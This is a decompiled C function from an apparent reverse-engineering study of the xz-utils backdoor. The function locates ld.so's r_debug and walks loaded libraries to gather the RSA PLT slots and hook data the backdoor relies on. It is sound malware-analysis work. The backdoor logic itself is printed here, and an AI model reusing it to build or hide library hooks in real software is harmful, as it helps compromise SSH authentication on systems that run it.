// /home/kali/xzre-ghidra/xzregh/104A40_process_shared_libraries.c
// Function: process_shared_libraries @ 0x104A40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_shared_libraries(backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Wrapper around `process_shared_libraries_map` that first resolves `r_debug` out of ld.so, copies the caller-provided struct into
 * a local scratch copy, and feeds the scratch copy into the map-walker. On success it propagates the filled-in handles (and libc
 * import table) back to the caller so later stages never have to read `r_debug` again.
 */

#include "xzre_types.h"

BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)

{
  BOOL success;
  Elf64_Sym *r_debug_symbol;
  uchar *r_debug_addr;
  backdoor_shared_libraries_data_t tmp_state;
  Elf64_Sym *r_debug_sym;
  uchar *debug_block;
  void *saved_RSA_public_decrypt_plt;
  void *saved_EVP_PKEY_set1_RSA_plt;
  void *saved_RSA_get0_key_plt;
  backdoor_hooks_data_t **saved_hooks_data_addr;
  libc_imports_t *saved_libc_imports;
  
  r_debug_symbol = elf_symbol_get(data->elf_handles->dynamic_linker,STR_r_debug,STR_GLIBC_2_2_5);
  success = FALSE;
  if (r_debug_symbol != (Elf64_Sym *)0x0) {
    debug_block = (uchar *)data->elf_handles;
    r_debug_addr = ((elf_handles_t *)debug_block)->dynamic_linker->elfbase->e_ident + r_debug_symbol->st_value;
    success = FALSE;
    if (0 < *(int *)r_debug_addr) {
      r_debug_sym = (Elf64_Sym *)data->shared_maps;
      saved_RSA_public_decrypt_plt = data->rsa_public_decrypt_slot;
      saved_EVP_PKEY_set1_RSA_plt = data->evp_set1_rsa_slot;
      saved_RSA_get0_key_plt = data->rsa_get0_key_slot;
      saved_hooks_data_addr = data->hooks_data_slot;
      saved_libc_imports = data->libc_imports;
      success = process_shared_libraries_map
                        (*(link_map **)(r_debug_addr + 8),(backdoor_shared_libraries_data_t *)&r_debug_sym
                        );
      success = (BOOL)(success != FALSE);
    }
  }
  return success;
}

